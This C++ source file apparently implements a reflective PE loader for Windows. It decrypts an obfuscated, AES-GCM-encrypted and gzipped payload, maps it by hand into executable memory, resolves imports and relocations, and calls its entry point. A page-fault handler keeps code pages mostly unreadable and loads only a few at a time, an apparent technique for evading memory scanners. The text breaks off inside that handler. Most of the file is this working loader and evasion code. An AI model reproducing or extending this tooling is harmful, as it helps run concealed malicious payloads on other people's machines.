#include "stuff2.h"




std::string stuff::DecryptAESKey(const BYTE* encryptedPayload, size_t keySize_inBytes) {
        if (keySize_inBytes > 0) {
            BYTE* decryptedKey = (BYTE*)malloc(keySize_inBytes - 1);
            BYTE magicbyte = encryptedPayload[0] ^ encryptedPayload[1];
            for (size_t i = 0; i < keySize_inBytes - 1; ++i) {
                decryptedKey[i] = encryptedPayload[i + 1] ^ (BYTE)(magicbyte + i);
            }
            return std::string(reinterpret_cast<char*>(decryptedKey), keySize_inBytes - 1);
        } else {return "";}
    }


BOOL stuff::GZIPdecompress(const BYTE* inCompressedPayload, size_t inLen, BYTE* outDecompressedPayload, size_t *InOutDecompressedSize) {
        z_stream zs;
        memset(&zs, 0, sizeof(zs));
        if (inflateInit2(&zs, 15 + 32) != Z_OK) {printf("inflateInit2 failed while decompressing payload!\n"); return FALSE;}

        size_t totalWritten = 0;
        zs.next_in = (Bytef*)inCompressedPayload;
        zs.avail_in = (uInt)inLen;

        int ret;
        BYTE outerbuf[32768];

        do {
            zs.next_out = outerbuf;
            zs.avail_out = sizeof(outerbuf);

            ret = inflate(&zs, Z_NO_FLUSH);
            size_t produced = sizeof(outerbuf) - zs.avail_out;
            if (produced + totalWritten > *InOutDecompressedSize) {printf("Decompression failed!\n"); inflateEnd(&zs); return FALSE;}
            memcpy(outDecompressedPayload + totalWritten, outerbuf, produced);
            totalWritten += produced;

        } while (ret != Z_STREAM_END);

        if (ret != Z_OK && ret != Z_STREAM_END) {printf("Return value unexpected, decompression failed!\n"); inflateEnd(&zs); return FALSE;}

        *InOutDecompressedSize = zs.total_out;
        inflateEnd(&zs);
	    printf("Decompression succeeded!\n");
	    return TRUE;
    }


// static void stuff::print_openssl_error(const std::string &msg) {
//     std::cerr << msg << "\n";
//     ERR_print_errors_fp(stderr);
// }
// static BOOL stuff::deriveKey(const std::string &password, const BYTE* salt, BYTE* outKey) {
//     if (!PKCS5_PBKDF2_HMAC(
//         password.c_str(),
//         static_cast<int>(password.size()),
//         salt, 
//         SALT_LEN,
//         PBKDF2_ITER,
//         EVP_sha256(),
//         KEY_LEN,
//         outKey
//     )) {print_openssl_error("deriveKey failed!\n"); return FALSE;}
//     return TRUE;
// }

static BOOL stuff::deriveKeyBCrypt(const BCRYPT_ALG_HANDLE& algHandle, const std::string&password, const BYTE* salt, BYTE* outkey) {
    if (BCryptDeriveKeyPBKDF2(
        algHandle,
        (PUCHAR)password.data(),
        (ULONG)password.size(),
        (PUCHAR)salt,
        (ULONG)SALT_LEN,
        (ULONGLONG)PBKDF2_ITER,
        (PUCHAR)outkey,
        (ULONG)KEY_LEN,
        0) != STATUS_SUCCESS) {std::cout << "derivekeyBCrypt failed!\n"; return FALSE;}
        return TRUE;
}

BOOL stuff::decryptPayloadBCrypt(const std::string& password, const BYTE* encryptedPayload, size_t encryptedPayloadSize, BYTE* decryptedPayload, size_t* decryptedPayloadSize) {
    const wchar_t* mode = BCRYPT_CHAIN_MODE_GCM;
    BYTE salt[SALT_LEN];
    BYTE IV[IV_LEN];
    BCRYPT_ALG_HANDLE decryptHandle;
    if (BCryptOpenAlgorithmProvider(&decryptHandle, BCRYPT_AES_ALGORITHM, NULL, 0) != STATUS_SUCCESS) {std::cout << "BCryptOpenAlgorithmProvider decryptHandle failed!\n"; return FALSE;}
    if (BCryptSetProperty(decryptHandle, BCRYPT_CHAINING_MODE,(PUCHAR)mode, (ULONG)((wcslen(mode) + 1) * sizeof(wchar_t)), 0) != STATUS_SUCCESS) {std::cout << "BCryptSetProperty (GCM) failed!\n"; return FALSE;}
    
    memcpy(salt, encryptedPayload, SALT_LEN);
    memcpy(IV, encryptedPayload + SALT_LEN, IV_LEN);
    size_t ciphertext = encryptedPayloadSize - SALT_LEN - IV_LEN - TAG_LEN;

    BYTE tag[TAG_LEN];
    memcpy(tag, encryptedPayload + SALT_LEN + IV_LEN + ciphertext, TAG_LEN);

    BCRYPT_ALG_HANDLE deriveKeyHandle;
    if (BCryptOpenAlgorithmProvider(&deriveKeyHandle, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG) != STATUS_SUCCESS) {std::cout << "BCryptOpenAlgorithmProvider deriveKeyHandle failed!\n"; return FALSE;}
    BYTE derivedKey[KEY_LEN];
    BCRYPT_KEY_HANDLE key = NULL;
    if(!deriveKeyBCrypt(deriveKeyHandle, password, salt, derivedKey)) {return FALSE;}
    if(BCryptGenerateSymmetricKey(decryptHandle, &key, NULL, 0, (PUCHAR)derivedKey, (ULONG)KEY_LEN, 0) != STATUS_SUCCESS) {std::cout << "BCryptGenerateSymmetricKey failed!\n"; return FALSE;}

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO cipherInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(cipherInfo);
    cipherInfo.pbNonce = (PUCHAR)IV;
    cipherInfo.cbNonce = (ULONG)IV_LEN;
    cipherInfo.pbTag = (PUCHAR)tag;
    cipherInfo.cbTag = (ULONG)TAG_LEN;
    ULONG AmountOfdecryptedBytes = 0;
    if(BCryptDecrypt(key, (PUCHAR)(encryptedPayload + SALT_LEN + IV_LEN), (ULONG)ciphertext, &cipherInfo, NULL, 0, (PUCHAR)decryptedPayload, ciphertext, &AmountOfdecryptedBytes, 0) 
    != STATUS_SUCCESS) {std::cout << "BCryptDecrypt failed!\n"; return FALSE;}

    if (AmountOfdecryptedBytes != ciphertext) {std::cout << "AmountOfDecryptedBytes is NULL\n"; return FALSE;}
    *decryptedPayloadSize = (size_t)AmountOfdecryptedBytes;
    BCryptDestroyKey(key);
    BCryptCloseAlgorithmProvider(decryptHandle, 0);
    BCryptCloseAlgorithmProvider(deriveKeyHandle, 0);
    return TRUE;
}

// BOOL stuff::decryptPayload(const std::string& password, const BYTE* encryptedPayload, size_t encryptedPayloadSize, BYTE* decryptedPayload, size_t* decryptedPayloadSize) {
//     size_t totalDecrypted = 0;
//     BYTE salt[SALT_LEN];
//     BYTE IV[IV_LEN];

//     if (encryptedPayloadSize < SALT_LEN + IV_LEN + TAG_LEN) {printf("Payload is too small!\n"); return FALSE;}
//     memcpy(salt, encryptedPayload, SALT_LEN);
//     memcpy(IV, encryptedPayload + SALT_LEN, IV_LEN); 
//     size_t cipherText = encryptedPayloadSize - SALT_LEN - IV_LEN - TAG_LEN;

//     BYTE tag[TAG_LEN];
//     memcpy(tag, encryptedPayload + SALT_LEN + IV_LEN + cipherText, TAG_LEN);

//     BYTE key[KEY_LEN];
//     if(!deriveKey(password, salt, key)) {return FALSE;}

//     EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
//     if(!ctx) {print_openssl_error("CTX wasn't initialized!"); return FALSE;}
    
//     if(1 == 2) {
//         clear:
//         EVP_CIPHER_CTX_free(ctx);
//         OPENSSL_cleanse(key, KEY_LEN);
//         return FALSE; 
//     }

//     if(!EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr)) {print_openssl_error("EVP_DecryptInit_ex cipher initialization failed!"); goto clear;}
//     if(!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, IV_LEN, nullptr)) {print_openssl_error("EVP_CIPHER_CTX_ctrl set IV_LEN failed!"); goto clear;}
//     if(!EVP_DecryptInit_ex(ctx, nullptr, nullptr, key, IV)) {print_openssl_error("EVP_DecryptInit_ex set key/IV failed!"); goto clear;}

//     int outLength;
//     if(!EVP_DecryptUpdate(ctx, decryptedPayload, &outLength, encryptedPayload + SALT_LEN + IV_LEN, cipherText)) {print_openssl_error("EVP_DecryptUpdate failed!"); goto clear;}
//     totalDecrypted += outLength;

//     if(!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, TAG_LEN, tag)) {print_openssl_error("EVP_CIPHER_CTX_ctrl set TAG failed!"); goto clear;}
//     if(!EVP_DecryptFinal_ex(ctx, decryptedPayload, &outLength)) 
//     {
//         print_openssl_error("EVP_DecryptFinal_ex failed, decryptedPayload & decryptedPayloadSize NULLED!"); 
//         memset(decryptedPayload, 0, totalDecrypted);  
//         if (decryptedPayloadSize) {*decryptedPayloadSize = 0;}
//         goto clear;
//     }
//     totalDecrypted += outLength;
    
//     *decryptedPayloadSize = totalDecrypted;
//     EVP_CIPHER_CTX_free(ctx);
//     OPENSSL_cleanse(key, KEY_LEN);
//     printf("Decrypted successfully!\n");
//     return TRUE; 
// }



BOOL stuff::readPE(const BYTE* payload, size_t payloadSize, IMAGE_DOS_HEADER* outMZ, DWORD* sig, IMAGE_FILE_HEADER* outFL, IMAGE_OPT_HEADER* outOPT, IMAGE_SECTION_HEADER** outSEC) {
    IMAGE_DOS_HEADER MZh;
	DWORD SG;
	IMAGE_FILE_HEADER FLh;
	IMAGE_OPT_HEADER OPh;
	IMAGE_SECTION_HEADER *SCh;
    size_t offset = 0;

    if (payloadSize < DOS_HEADER_SIZE) { printf("Binary size is smaller than MZ_Header\n"); return FALSE; }
    memcpy(&MZh, payload + offset, DOS_HEADER_SIZE);
    if (MZh.e_magic != 0x5a4d) { printf("It isn't a PE-file\n");  return FALSE; }
    if (payloadSize < (MZh.e_lfanew + SIGNATURE_SIZE + FILE_HEADER_SIZE + OPT_HEADER_SIZE)) { printf("File is too small or corrupted\n");  return FALSE; }
    offset = MZh.e_lfanew;

    memcpy(&SG, payload + offset, SIGNATURE_SIZE);
    if (SG != 0x4550) { printf("Siganture is broken\n"); return FALSE; }
    offset += SIGNATURE_SIZE;

    memcpy(&FLh, payload + offset, FILE_HEADER_SIZE);
    offset += FILE_HEADER_SIZE;
    printf("Section count: %d", FLh.NumberOfSections); printf("\nOptional Header Size: %d \n", (int)FLh.SizeOfOptionalHeader);
    if (FLh.SizeOfOptionalHeader != OPT_HEADER_SIZE) { printf("Optional Header size is wrong\n");  return FALSE; }

    memcpy(&OPh, payload + offset, OPT_HEADER_SIZE); 
    offset += OPT_HEADER_SIZE;
    printf("Import table address = %X\n", OPh.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
	printf("Import table size = %d\n", OPh.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size);
	printf("Import address table address = %X\n", OPh.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress);
	printf("Import address table address size = %d\n", OPh.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size);

    if (payloadSize < (offset + SECTION_HEADER_SIZE * (FLh.NumberOfSections))) { printf("File is too small (Sections)\n");  return FALSE; }
    SCh = (IMAGE_SECTION_HEADER*)malloc(SECTION_HEADER_SIZE * (FLh.NumberOfSections));
    memcpy(SCh, payload + offset, (SECTION_HEADER_SIZE * (FLh.NumberOfSections)));

    *outMZ = MZh;
	*outFL = FLh;
	*sig = SG;
	*outOPT = OPh;
 	*outSEC = SCh;
	section_count = (int)FLh.NumberOfSections;
	printf("section_count = %d\n", section_count);

	return TRUE;
}

BOOL stuff::loadPE(const BYTE* payload, IMAGE_DOS_HEADER* in_MZHeader, DWORD* in_Signature, IMAGE_FILE_HEADER* in_FILEHeader, IMAGE_OPT_HEADER* in_OPTHeader, IMAGE_SECTION_HEADER* in_SCHeader, LPVOID ImageBase) 
{
unsigned long sizeofheaders = in_OPTHeader->SizeOfHeaders;
	int i;
    size_t offset = 0;

	for (i = 0; i < in_FILEHeader->NumberOfSections; ++i) {
		if (in_SCHeader[i].PointerToRawData < sizeofheaders) {
			sizeofheaders = in_SCHeader[i].PointerToRawData;
		}
	}

	
	printf("Header Size = %d\n", sizeofheaders);
    memcpy(ImageBase, payload + offset, sizeofheaders);


	for (i = 0; i < in_FILEHeader->NumberOfSections; ++i) {
		BYTE* dest = (BYTE*)ImageBase + in_SCHeader[i].VirtualAddress;
		if (in_SCHeader[i].SizeOfRawData > 0) {
            if (strcmp((const char*)in_SCHeader[i].Name, ".text") == 0) {
				printf("Skipping section %s [%d] to lazy load, section address %p\n", (const char*)in_SCHeader[i].Name, i, (BYTE*)ImageBase + in_SCHeader[i].VirtualAddress);
				
				DWORD old;
				VirtualProtect(dest, in_SCHeader[i].Misc.VirtualSize, PAGE_NOACCESS, &old);
				continue;
			}
			unsigned long toRead = in_SCHeader[i].SizeOfRawData;
            offset = in_SCHeader[i].PointerToRawData;
			memcpy(dest, payload + offset, toRead);
			if (in_SCHeader[i].Misc.VirtualSize > in_SCHeader[i].SizeOfRawData) {
				memset(dest + in_SCHeader[i].SizeOfRawData, 0, in_SCHeader[i].Misc.VirtualSize - in_SCHeader[i].SizeOfRawData);
			}
		}
		else {
			if (in_SCHeader[i].Misc.VirtualSize) 
			{
				memset(dest, 0, in_SCHeader[i].Misc.VirtualSize);
			}
		}
	} 

	return TRUE;
}

BOOL stuff::doImports(IMAGE_OPT_HEADER* inOPT, LPVOID ImageBase) {
	IMAGE_DATA_DIRECTORY ImportDIR = inOPT->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	if (ImportDIR.Size == 0) { return TRUE; }

	IMAGE_IMPORT_DESCRIPTOR* importdesc = (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)ImageBase + ImportDIR.VirtualAddress);
	for (; importdesc->Name != 0; ++importdesc) {
		CHAR* dllname = (CHAR*)((BYTE*)ImageBase + importdesc->Name);
		HMODULE hMod = NULL;

		hMod = GetModuleHandleA(dllname);
		if (!hMod) { hMod = LoadLibraryA(dllname); }
		if (!hMod) { printf("Library %s wasn't loaded\n", dllname); return FALSE; }
		IMAGE_THUNK_DATA* ilt = (IMAGE_THUNK_DATA*)((BYTE*)ImageBase + importdesc->OriginalFirstThunk);
		IMAGE_THUNK_DATA* iat = (IMAGE_THUNK_DATA*)((BYTE*)ImageBase + importdesc->FirstThunk);

		if (importdesc->OriginalFirstThunk == 0) { ilt = iat; };

		for (; ilt->u1.AddressOfData != 0; ilt++, iat++) {
			FARPROC fn;
			if (ilt->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
				WORD ord = (WORD)(ilt->u1.Ordinal & 0xFFFF);
				fn = GetProcAddress(hMod, (LPCSTR)ord);
				if (fn == NULL) { printf("GetProcAdress() for ordinal %d failed\n", ord); return FALSE; }
				iat->u1.Function = (ULONGLONG)fn;
			} else 
			{
				IMAGE_IMPORT_BY_NAME* ibn = (IMAGE_IMPORT_BY_NAME*)((BYTE*)ImageBase + ilt->u1.AddressOfData);
				CHAR* funcName = (CHAR*)ibn->Name;
				fn = GetProcAddress(hMod, funcName);
				if (fn == NULL) { printf("GetProcAdress(%s) failed\n", funcName); return FALSE; }
				iat->u1.Function = (ULONGLONG)fn;
			}
		}
	}
	return TRUE;
}
BOOL stuff::doRelocs(IMAGE_OPT_HEADER *inOpt, LPVOID ImageBase) {
	if (inOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size == 0) return TRUE;
	BYTE *relocStart = (BYTE*)ImageBase + inOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
	BYTE *relocEnd = relocStart + inOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;  
	ULONGLONG delta = (ULONGLONG)((BYTE*)ImageBase - inOpt->ImageBase);
	if (delta == 0) { 
	printf("ImageBase is correct\n");
	return TRUE;}

	while (relocStart < relocEnd) {

		IMAGE_BASE_RELOCATION* block = (IMAGE_BASE_RELOCATION*)relocStart;
		DWORD base = block->VirtualAddress;
		DWORD size = block->SizeOfBlock;

		if (base >= SC_Header[0].VirtualAddress && base < SC_Header[0].VirtualAddress + SC_Header[0].Misc.VirtualSize) {
			printf("skipping .text relocations\n");
			relocStart += size;
			continue;
		}
        
		if (size == 0) {break;} 
		if (size < sizeof(IMAGE_BASE_RELOCATION)) {printf("Invalid SizeOfBlock\n"); return FALSE;}
		WORD *entries = (WORD*)(block + 1);

		DWORD count = ((size - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD));
		for (DWORD i = 0; i < count; ++i) {
			WORD type = entries[i] >> 12;
			WORD offset = entries[i] & 0x0FFF;

			BYTE* addresstopatch = (BYTE*)ImageBase + base + offset;

			if (type == IMAGE_REL_BASED_ABSOLUTE) continue;
			else if (type == IMAGE_REL_BASED_HIGHLOW) *(DWORD*)addresstopatch += delta;
			else if (type == IMAGE_REL_BASED_DIR64) *(ULONGLONG*)addresstopatch += delta;
			else { printf("doRelocs failed, type is unknown\n"); return FALSE;}
		}
		relocStart = (BYTE*)block + block->SizeOfBlock;
	}
	return TRUE;
}

DWORD stuff::characteristicsToProtect(DWORD ch) {
    bool r = ch & IMAGE_SCN_MEM_READ;
    bool w = ch & IMAGE_SCN_MEM_WRITE;
    bool x = ch & IMAGE_SCN_MEM_EXECUTE;

    if (x) {
        if (w) return PAGE_EXECUTE_READWRITE;
        if (r) return PAGE_EXECUTE_READ;
        return PAGE_EXECUTE;
    } else {
        if (w) return PAGE_READWRITE;
        if (r) return PAGE_READONLY;
        return PAGE_NOACCESS;
    }
}

BOOL stuff::changeProtection(IMAGE_SECTION_HEADER* sec, LPVOID ImageBase) {
    DWORD oldprotect;
	LPVOID secBase = (BYTE*)ImageBase + sec->VirtualAddress;
	SIZE_T size = sec->Misc.VirtualSize;

	if (size == 0) return TRUE;
	if (strcmp((const char*)sec->Name, ".text") == 0) {
		printf("changeProtection() for .text section being skipped!\n");
		return TRUE;
	}
	DWORD prot = characteristicsToProtect(sec->Characteristics);

	return VirtualProtect(secBase, size, prot, &oldprotect);
}
BOOL stuff::callTLScallbacks(IMAGE_OPT_HEADER *inOh, LPVOID ImageBase, DWORD dwReason) {
	 if (inOh->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size == 0) {printf("TLS callbacks are empty!\n"); return TRUE;}
	 TLS_DIRECTORY* tlsDir = (TLS_DIRECTORY*)((BYTE*)ImageBase + inOh->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);

	 if (tlsDir->AddressOfCallBacks == 0) {printf("AddressOfCallback is 0!\n"); return TRUE;}
	 PIMAGE_TLS_CALLBACK *callbacks = (PIMAGE_TLS_CALLBACK*)((BYTE*)ImageBase + (tlsDir->AddressOfCallBacks - inOh->ImageBase));
	 if (callbacks == NULL) {printf("There aren't any callbacks!\n"); return TRUE;}
	 for (SIZE_T i = 0; callbacks[i]; i++) {
		callbacks[i](ImageBase, dwReason, NULL);
		printf("Callback №%d called", i);
	}
	return TRUE;
}
BOOL stuff::callEXE_EntryPoint(IMAGE_OPT_HEADER *inOh, LPVOID ImageBase) {
	EntryFn entry = (EntryFn)((BYTE*)ImageBase + inOh->AddressOfEntryPoint);
	printf("Calling EXE entry at %p...\n", entry);
	try {
		entry();
		printf("Entry point called successfullly!\n");
		return TRUE;
	} catch(...) {
		printf("Exception while entry point call!\n");
		return FALSE;
	}
}

BOOL stuff::LoadPEMain(const BYTE* payload, size_t payloadSize) {
    IMAGE_DOS_HEADER MZ_Header;
	DWORD Signature;
	IMAGE_FILE_HEADER FL_Header;

    if (readPE(payload, payloadSize, &MZ_Header, &Signature, &FL_Header, &OPT_Header, &SC_Header)) {
        SIZE_T imageSize = OPT_Header.SizeOfImage;
        ImageBase = VirtualAlloc(NULL, imageSize, MEM_RESERVE |
					MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (ImageBase) {
			printf("Image Base address = %p\n", ImageBase);
            if (loadPE(payload, &MZ_Header, &Signature, &FL_Header, &OPT_Header, SC_Header, ImageBase)) {
                printf("ImageBase load successful!\n");
                if(doImports(&OPT_Header, ImageBase)) {
                    printf("DoImports succeded!\n");
                    if(doRelocs(&OPT_Header, ImageBase)) {
                        printf("Relocation patch is successful!\n");
                        for (SIZE_T i = 0; i < FL_Header.NumberOfSections; i++) {
                            if (!changeProtection(&SC_Header[i], ImageBase)) {printf("changeProtection for SC_Header[%d] failed!\n", i); VirtualFree(ImageBase, 0, MEM_RELEASE); return FALSE;}
                        } 
                        if (callTLScallbacks(&OPT_Header, ImageBase, DLL_PROCESS_ATTACH)) {
                            if(doExceptionTable(&OPT_Header, ImageBase)) {
                                
                                if (AddVectoredExceptionHandler(1, PageFaultHandler) != NULL) {
                                    printf("PageFaultHandler was initialized!\n");
                                    
									//std::vector<Page> pagesToExecute;
                                    //splitTextInPages(pagesToExecute);
                                    //smallList.emplace_back(pagesToExecute[0]);
									//printf("pagesToExecute[0] ==  %p\n", pagesToExecute[0].pageAdress);
                                    
									callEXE_EntryPoint(&OPT_Header, ImageBase);

                                } else {printf("Exception Tables failed!\n"); VirtualFree(ImageBase, 0, MEM_RELEASE); return FALSE;}
                                
                        } else {printf("Exception Tables failed!\n"); VirtualFree(ImageBase, 0, MEM_RELEASE); return FALSE;}
                        } else {printf("TLS patch failed!\n"); VirtualFree(ImageBase, 0, MEM_RELEASE); return FALSE;}
                    }else {printf("DoRelocs failed!\n"); VirtualFree(ImageBase, 0, MEM_RELEASE); return FALSE;}
                } else {printf("DoImports failed!\n"); VirtualFree(ImageBase, 0, MEM_RELEASE); return FALSE;}
            }
        } 
    } 
    return TRUE;
}


BOOL stuff::doRelocsForPage(IMAGE_OPT_HEADER* inOpt, LPVOID ImageBase, ULONG_PTR pageStart) {
    if (inOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size == 0) return TRUE;

    BYTE* relocStart = (BYTE*)ImageBase + inOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    BYTE* relocEnd = relocStart + inOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    ULONGLONG delta = (ULONGLONG)((BYTE*)ImageBase - inOpt->ImageBase);

    if (delta == 0) return TRUE;

    DWORD targetPageRVA = (DWORD)(pageStart - (ULONG_PTR)ImageBase);

    while (relocStart < relocEnd) {
        IMAGE_BASE_RELOCATION* block = (IMAGE_BASE_RELOCATION*)relocStart;
        if (block->SizeOfBlock == 0) break;

        DWORD base = block->VirtualAddress;
        WORD* entries = (WORD*)(block + 1);
        DWORD count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

        for (DWORD i = 0; i < count; ++i) {
            WORD type = entries[i] >> 12;
            WORD offset = entries[i] & 0x0FFF;
            DWORD patchRVA = base + offset;

            if (patchRVA >= targetPageRVA && patchRVA < targetPageRVA + PAGE_SIZE) {
                BYTE* addresstopatch = (BYTE*)ImageBase + patchRVA;

                if (type == IMAGE_REL_BASED_DIR64) {
                    *(ULONGLONG*)addresstopatch += delta;
                }
                else if (type == IMAGE_REL_BASED_HIGHLOW) {
                    *(DWORD*)addresstopatch += (DWORD)delta;
                }
            }
        }
        relocStart += block->SizeOfBlock;
    }
    return TRUE;
}

VOID stuff::splitTextInPages(std::vector<Page>& v) {
	
	BYTE* textBase = (BYTE*)SC_Header[0].VirtualAddress;
	BYTE* start = textBase;
	SIZE_T totalSize = SC_Header[0].Misc.VirtualSize;

		while ((start + PAGE_SIZE) < (textBase + totalSize)) {
			v.emplace_back((LPVOID)((BYTE*)ImageBase + (ULONG_PTR)start), PAGE_SIZE);
			start += PAGE_SIZE;
		}

	v.emplace_back((LPVOID)((BYTE*)ImageBase + (ULONG_PTR)start), (textBase + totalSize) - start);
	printf("%d pages have been emplaced!\n", v.size());
}

BOOL stuff::doExceptionTable(IMAGE_OPT_HEADER *inOh, LPVOID ImageBase) {
	IMAGE_DATA_DIRECTORY exceptionDir = inOh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];

	if(exceptionDir.Size == 0 || exceptionDir.VirtualAddress == 0) {printf("exceptionDir size or address is equal to 0\n");return FALSE;}
	PIMAGE_RUNTIME_FUNCTION_ENTRY ptable = (PIMAGE_RUNTIME_FUNCTION_ENTRY)((BYTE*)ImageBase + exceptionDir.VirtualAddress);
	
	DWORD entriesCount = (DWORD)(exceptionDir.Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY));
	if(RtlAddFunctionTable((PRUNTIME_FUNCTION)ptable, entriesCount, (DWORD64)ImageBase)) {
	   printf("doExceptionTable() succeeded!\n");
	} else {printf("RtlAddFunctionTable failed!\n"); return FALSE;}

	return TRUE;
}
// LONG CALLBACK stuff::PageFaultHandler2(PEXCEPTION_POINTERS ExceptionsInfo) {
// 	std::ofstream os("output.txt", std::ios::app);
// 	os << "\n\n\n\n";
// 	if (ExceptionsInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
// 	ULONG_PTR faultAddr = ExceptionsInfo->ExceptionRecord->ExceptionInformation[1];
	
// 	for (int i = 0; i < section_count; ++i) {
		
// 		ULONG_PTR start = (ULONG_PTR)ImageBase + SC_Header[i].VirtualAddress;
// 		ULONG_PTR end = start + SC_Header[i].Misc.VirtualSize;
// 		DWORD old;
// 	if (faultAddr >= start && faultAddr < end) {
// 		os << std::hex << "Fault found, " << std::setw(16) << std::setfill('0') << faultAddr << '\n'; 
// 		//printf("Fault found, %p  \n", faultAddr);
// 		ULONG_PTR pageStart = faultAddr & ~0xFFF; 

// 		if (auto it = smallList.begin(); smallList.size() < 3) {
// 			smallList.emplace_back((LPVOID)faultAddr, PAGE_SIZE);
// 		} else if (smallList.size() >= 3) {
// 			auto it = smallList.begin();
// 			Page tmp = *it;
// 			memset((BYTE*)ImageBase + (ULONG_PTR)tmp.pageAdress, 0, tmp.pageSize);

// 			smallList.pop_front();
// 		}
// 		/*if (pageStart != lastpageadress) {
// 			memset((BYTE*)ImageBase + lastpageadress, 0, lastpagesize);
// 			os << std::hex << std::setw(16) << std::setfill('0') << lastpageadress << " has been nulled!\n";
// 			lastpageadress = pageStart - (ULONG_PTR)ImageBase;
// 		}*/

// 		//VirtualAlloc((LPVOID)pageStart, PAGE_SIZE, MEM_COMMIT, PAGE_READWRITE);

// 		DWORD offset = (DWORD)(pageStart - start);
// 		DWORD fileOffset = SC_Header[i].PointerToRawData + offset;

// 		DWORD rva = faultAddr - (ULONG_PTR)OPT_Header.ImageBase;
// 		os << std::hex << "rva of copy data " << std::setw(16) << std::setfill('0') << rva << "\n"; 

// 		os << std::hex << "file offset here! " << std::setw(16) << std::setfill('0') << fileOffset << "\n";
// 		os << std::hex << "Writing data for" << std::setw(16) << std::setfill('0') << faultAddr << "\n";
// 		//printf("Writing data for %p\n", faultAddr);
// 		VirtualProtect((LPVOID)pageStart, PAGE_SIZE, PAGE_READWRITE, &old);
// 		LPVOID addressToWrite = finalPayload + offset;
		
// 		os << std::hex << "FSeek for " << std::setw(16) << std::setfill('0') << faultAddr << "\n";
// 		//printf("FSeek for %p\n", faultAddr);
// 		memcpy((LPVOID)pageStart, addressToWrite, PAGE_SIZE);
// 		os << std::hex << "fread() for " << std::setw(16) << std::setfill('0') << faultAddr << " returned " << std::dec << PAGE_SIZE << '\n'; 
// 			//printf("fread() for %p returned %d/%d\n", faultAddr, result, PAGE_SIZE);

// 		//APPLY RELOCS FOR PAGE HERE
// 		if (doRelocsForPage(&OPT_Header, ImageBase, pageStart)) {
// 			os << std::hex << "Relocations done for " << std::setw(16) << std::setfill('0') << faultAddr << '\n'; 
// 			//printf("Relocations done for %p!\n", faultAddr);
// 		}
// 		//APPLY RELOCS FOR PAGE HERE
// 		VirtualProtect((LPVOID)pageStart, PAGE_SIZE, PAGE_EXECUTE_READ, &old);
// 		os << std::hex << "Virtual Protect is set to PAGE_EXECUTE_READ, retrying for " << std::setw(16) << std::setfill('0') << faultAddr << '\n'; 
// 		//printf("Virtual Protect is set to PAGE_EXECUTE_READ, retrying for %p!\n", faultAddr);
// 		//FlushInstructionCache(GetCurrentProcess(), (LPVOID)pageStart, PAGE_SIZE);
// 		return EXCEPTION_CONTINUE_EXECUTION;
// 		}
// 	}
//   }
//   return EXCEPTION_CONTINUE_SEARCH;
// }

LONG CALLBACK stuff::PageFaultHandler(PEXCEPTION_POINTERS ExceptionsInfo) {
	std::ofstream os("output.txt", std::ios::app);
	if (ExceptionsInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
	ULONG_PTR faultAddr = ExceptionsInfo->ExceptionRecord->ExceptionInformation[1];
    os << "\n\n\n\n";
    /////////////////////////////////////////////////////////////////////////////////////////////////
    os << std::hex << "Fault address " << std::setw(16) << std::setfill('0') << faultAddr << '\n';
    /////////////////////////////////////////////////////////////////////////////////////////////////
	
	for (int i = 0; i < section_count; ++i) {
		
		ULONG_PTR start = (ULONG_PTR)ImageBase + SC_Header[i].VirtualAddress;
		ULONG_PTR end = start + SC_Header[i].Misc.VirtualSize;
		DWORD old;
        os << "SC_Header[" << i << "]\n";
        // os << std::hex << "file offset here! " << std::setw(16) << std::setfill('0') << start << "\n";
        // os << std::hex << "file offset here! " << std::setw(16) << std::setfill('0') << end << "\n";
        // ULONG_PTR pageStart = faultAddr & ~0xFFF; 
        // DWORD offset = (DWORD)(pageStart - start);
        // DWORD fileOffset = SC_Header[i].PointerToRawData + offset;
        /////////////////////////////////////////////////////////////////////////////////////////////////
        // os << std::hex << "file offset here! " << std::setw(16) << std::setfill('0') << fileOffset << "\n";
        /////////////////////////////////////////////////////////////////////////////////////////////////
	if (faultAddr >= start && faultAddr < end) {
		os << std::hex << "Fault found, " << std::setw(16) << std::setfill('0') << faultAddr << '\n'; 
		//printf("Fault found, %p  \n", faultAddr);
		ULONG_PTR pageStart = faultAddr & ~0xFFF; 


		if (smallList.size() < 3) {
			smallList.emplace_back((LPVOID)pageStart, PAGE_SIZE);
			Page tmp = smallList.back();
			os << std::hex << "Fault emplaced " << std::setw(16) << std::setfill('0') << (ULONG_PTR)pageStart << '\n';
			os << std::hex << "Fault here " << std::setw(16) << std::setfill('0') << (ULONG_PTR)tmp.pageAdress << '\n';
		} 
			
